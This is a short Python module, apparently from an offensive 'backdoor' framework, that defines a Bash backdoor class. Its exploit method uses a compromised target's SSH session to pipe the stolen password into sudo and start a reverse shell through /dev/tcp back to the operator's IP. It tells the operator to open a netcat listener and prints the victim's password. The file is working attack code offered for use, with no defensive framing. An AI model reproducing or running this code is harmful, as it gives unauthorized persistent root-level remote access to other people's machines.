from backdoor import *

class Bash(Backdoor):
    prompt = Fore.RED + "(bash) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, target, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Bash backdoor..."
        self.target = target
        self.core = core
        self.options = {
                "port"   : Option("port", 53923, "port to connect to", True),
                }
        self.command = "echo " + self.target.pword + " | sudo -S nohup perl prsA.pl"
        self.enabled_modules = {}
        self.modules = {} 


    def check_valid(self):
        return True
    
    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None


    def do_exploit(self, args):
        port = self.get_value("port")

        print(GOOD + "Initializing backdoor...")
	raw_input("Please create a listener with the command nc -v -n -l -p " + str(port))
	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % port)
        print(GOOD + "Bash Backdoor on port %s attempted. You may need to input the password, which is " + self.target.pword)

